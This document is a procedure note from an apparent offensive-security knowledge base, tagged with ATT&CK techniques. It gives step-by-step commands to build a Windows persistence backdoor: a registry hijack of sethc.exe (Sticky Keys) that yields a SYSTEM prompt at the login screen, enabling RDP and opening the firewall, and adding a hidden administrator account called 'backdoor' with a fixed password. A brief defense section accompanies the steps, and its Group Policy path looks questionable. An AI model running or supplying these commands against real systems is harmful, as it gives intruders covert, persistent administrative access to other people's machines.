---
type: procedure
tactics:
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Initial Access|TA0001 - Initial Access]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
  - '[[tactics/Persistence|TA0003 - Persistence]]'
  - '[[tactics/Privilege Escalation|TA0004 - Privilege Escalation]]'
techniques:
  - '[[techniques/Accessibility Features|T1015 - Accessibility Features]]'
  - '[[techniques/Hide Artifacts|T1564 - Hide Artifacts]]'
  - >-
    [[techniques/Registry Run Keys / Startup Folder|T1060 - Registry Run Keys /
    Startup Folder]]
  - '[[techniques/Remote Desktop Protocol|T1076 - Remote Desktop Protocol]]'
  - '[[techniques/Valid Accounts|T1078 - Valid Accounts]]'
sub_techniques:
  - '[[sub-techniques/Hidden File System|T1564.005 - Hidden File System]]'
tags:
  - '[[tags/Elevated]]'
  - '[[tags/RDP Backdoor]]'
  - '[[tags/sethc.exe]]'
  - '[[tags/Windows - Persistence]]'
commands:
  - '[[commands/reg-add-sethc-debugger]]'
platforms:
  - Windows
tools: []
verified: true
validated: true
---

# Windows-Elevated-RDP-Backdoor-with-Sticky-Keys

## Summary

This procedure exploits the Windows Sticky Keys accessibility feature to establish an elevated RDP backdoor. By modifying the registry to redirect the sethc.exe process to cmd.exe, an attacker can gain SYSTEM-level command prompt access at the login screen by pressing the Shift key five times. From there, RDP is enabled, and a backdoor account is created for persistent remote access without replacing system files directly.

## Description

Sticky Keys (sethc.exe) is a built-in Windows accessibility tool that activates when the Shift key is pressed five times rapidly at the login screen. This procedure uses the Image File Execution Options registry key to hijack sethc.exe and launch cmd.exe with SYSTEM privileges instead. Once elevated access is obtained, the attacker enables Remote Desktop Protocol (RDP) via registry modification and creates a local administrator account for backdoor access. This technique evades basic file integrity monitoring since no files are altered, only registry values. It is suitable for post-compromise persistence on Windows workstations or servers where physical or initial low-privilege access is available. Success allows remote SYSTEM-level control via RDP, enabling further lateral movement or data exfiltration.

## Requirements

1. Local administrator privileges on the target Windows system (or initial foothold to execute commands)
2. Ability to modify HKLM registry hive
3. Target running Windows 7 or later (Sticky Keys feature enabled by default)
4. Network access for RDP connections post-setup

## Defense

- Disable Sticky Keys feature via Group Policy (Computer Configuration > Administrative Templates > Windows Components > File Explorer > Turn off Sticky Keys)
- Monitor registry changes to HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe using tools like Sysmon or Windows Event Logs (Event ID 4657 for registry modifications)
- Enable RDP logging and require multi-factor authentication (MFA) for remote sessions
- Use application whitelisting to prevent unauthorized cmd.exe executions from unexpected paths
- Regularly audit local administrator accounts and RDP access logs (Event ID 4624 for logons)

## Objectives

1. Hijack Sticky Keys to achieve SYSTEM privilege escalation at login screen
2. Enable RDP for remote access without physical presence
3. Create a hidden backdoor administrator account for persistence
4. Establish a stealthy elevated RDP entry point for ongoing operations

## Instructions

### Step 1: Modify Registry to Hijack Sticky Keys

**Context**: Add a Debugger registry value under Image File Execution Options for sethc.exe to redirect execution to cmd.exe. This allows launching a SYSTEM command prompt via the Sticky Keys shortcut without altering files.

**Command** ([[commands/reg-add-sethc-debugger]]):
```cmd
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
```

> This command creates or overwrites the Debugger value, forcing sethc.exe to spawn cmd.exe with inherited SYSTEM privileges. Run it from an elevated prompt. If successful, no output is shown beyond confirmation; verify by checking the registry key exists and points to cmd.exe.

### Step 2: Trigger Sticky Keys for Elevated Access

**Context**: Log off or lock the system to reach the login screen. Press Shift five times to activate the hijacked Sticky Keys, launching a SYSTEM cmd.exe window.

**Instructions**: 
1. Execute `logoff` or lock the workstation (Win+L).
2. At the login screen, rapidly press the Shift key five times.
3. A black command prompt window should appear with SYSTEM privileges (verify with `whoami /priv` showing SeDebugPrivilege enabled).

> No command is needed here; this step validates the registry modification. If it fails, ensure the registry key is set correctly and Sticky Keys is not disabled.

### Step 3: Enable Remote Desktop Protocol

**Context**: From the SYSTEM cmd prompt, modify the registry to activate RDP server functionality if disabled.

**Instructions**:
1. Run the following to enable RDP:
```cmd
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
```
2. Start the RDP service:
```cmd
sc start TermService
```
3. Open firewall port for RDP:
```cmd
netsh advfirewall firewall set rule group="remote desktop" new enable=Yes
```

> These commands activate RDP listening on port 3389. Verify with `netstat -an | find "3389"` showing LISTENING state. Restart may be required for changes to take effect.

### Step 4: Create Backdoor Administrator Account

**Context**: Add a new local user with administrator privileges for RDP logon, ensuring persistence.

**Instructions**:
1. Create the user:
```cmd
net user backdoor Password123! /add
```
2. Add to administrators group:
```cmd
net localgroup administrators backdoor /add
```
3. Optionally, hide the user from login screen by modifying registry (optional for stealth):
```cmd
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v backdoor /t REG_DWORD /d 0 /f
```

> The account 'backdoor' with password 'Password123!' is now created. Test RDP connection from an external machine using these credentials. Change password in production use. Success: `net user backdoor` shows the account exists and is active.
